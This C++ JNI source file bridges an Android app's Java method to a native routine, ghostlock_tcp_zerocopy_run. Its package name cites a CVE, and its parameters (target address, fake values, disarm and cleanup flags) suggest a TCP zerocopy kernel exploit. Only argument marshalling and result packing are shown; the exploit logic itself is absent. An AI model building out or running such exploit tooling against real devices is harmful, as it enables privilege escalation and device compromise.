#include <jni.h>

#include <cstdint>

extern "C" int ghostlock_tcp_zerocopy_run(std::uint64_t target, std::int32_t mode,
                                           std::int32_t preserve_child,
                                           const std::uint64_t *fake_values,
                                           std::int32_t *out_status, std::int32_t *out_step,
                                           std::int32_t *out_errno, std::int32_t *out_clean,
                                           std::int32_t *out_disarmed,
                                           std::int32_t *out_calls,
                                           std::int32_t *out_successes,
                                           std::int32_t *out_ret,
                                           std::int32_t *out_get_errno,
                                           std::int32_t *out_zc) noexcept;

namespace {
    constexpr jsize kResultBytes = 64;
    void put32(jbyte *p, std::int32_t v) noexcept {
        const std::uint32_t u = static_cast<std::uint32_t>(v);
        p[0] = static_cast<jbyte>(u); p[1] = static_cast<jbyte>(u >> 8U);
        p[2] = static_cast<jbyte>(u >> 16U); p[3] = static_cast<jbyte>(u >> 24U);
    }
}  // namespace

extern "C" JNIEXPORT jbyteArray JNICALL
Java_com_ghostlock_app_jni_cve43499_NativeTcpZerocopyJni_execute(
    JNIEnv *env, jclass, jlong target, jint mode, jint preserve_child, jlongArray fake_array) {
    std::int32_t status = -1, step = 0, error = 0, clean = 0, disarmed = 0;
    std::int32_t calls = 0, successes = 0, get_ret = 0, get_errno = 0, zc = 0;
    std::uint64_t fake[10] = {};
    if (fake_array != nullptr) {
        const jsize count = env->GetArrayLength(fake_array);
        if (count > 10) return nullptr;
        jlong *values = env->GetLongArrayElements(fake_array, nullptr);
        if (values == nullptr) return nullptr;
        for (jsize i = 0; i < count; ++i) fake[i] = static_cast<std::uint64_t>(values[i]);
        env->ReleaseLongArrayElements(fake_array, values, JNI_ABORT);
    }
    if (ghostlock_tcp_zerocopy_run(static_cast<std::uint64_t>(target), mode, preserve_child, fake,
                                   &status, &step, &error, &clean, &disarmed,
                                   &calls, &successes, &get_ret, &get_errno, &zc) != 0) {
        return nullptr;
    }
    jbyte out[kResultBytes] = {};
    put32(out, status); put32(out + 4, step); put32(out + 8, error);
    put32(out + 12, clean); put32(out + 16, disarmed);
    put32(out + 20, calls); put32(out + 24, successes); put32(out + 28, get_ret);
    put32(out + 32, get_errno); put32(out + 36, zc);
    jbyteArray answer = env->NewByteArray(kResultBytes);
    if (answer == nullptr) return nullptr;
    env->SetByteArrayRegion(answer, 0, kResultBytes, out);
    return answer;
}
